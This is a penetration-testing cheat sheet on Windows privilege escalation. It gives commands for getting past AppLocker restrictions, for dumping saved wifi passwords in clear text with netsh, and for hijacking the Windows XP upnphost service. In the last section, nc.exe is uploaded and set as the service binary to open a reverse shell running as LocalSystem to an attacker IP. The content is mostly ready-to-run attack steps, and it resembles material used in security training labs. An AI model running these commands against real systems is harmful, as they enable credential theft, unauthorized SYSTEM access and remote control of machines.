# Privilege Escalation

## **Bypass Applocker**

* Bypass cmd/powershell restriction :&#x20;
  * Create a .bat file
  * Use this command :&#x20;
    * cmd.exe /C powershell.exe
* Create a new drive&#x20;
  * C:\Windows\System32\subst.exe H: C:\\&#x20;
    * _Can be run in the explorer windows _
  * Then try to start CMD or POWERSHELL

## **Gather wifi credentials locally**

It is possible to dump the SSID and the password the device has been connected to

* Gather the SSID the workstation has been connected to: `netsh wlan show profiles`
* Get the clear text password associated to the SSID: `netsh wlan show profile name=<SSID> key=clear`
* Export wireless config: `netsh wlan export profile key=clear` will create one .XML file by SSID

## **Windows XP upnphost service**

* On SP0 and SP1 the upnphost service can be used to escalate privileges
* Use accesschk **version 5.1**
* Set **BINARY mode** when you download it with FTP : `ftp 10.11.1.13` then `binary`
* `accesschk-2003-xp.exe /accepteula`
* `accesschk-2003-xp.exe -uwcqv "Authenticated Users" * /accepteula`
* `aaccesschk-2003-xp.exe -ucqv upnphost /accepteula`
* `sc qc upnphost`
* Upload nc.exe on the target via **FTP using binary mode**
* Modify the configuration of the upnphost service

```
C:\Inetpub\wwwroot>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe <IP> 9999 -e c:\Windows\system32\cmd.exe"
C:\Inetpub\wwwroot>sc config upnphost obj= ".\LocalSystem" password= ""
C:\Inetpub\wwwroot>sc config upnphost depend= ""
C:\Inetpub\wwwroot>net start upnphost
```

****
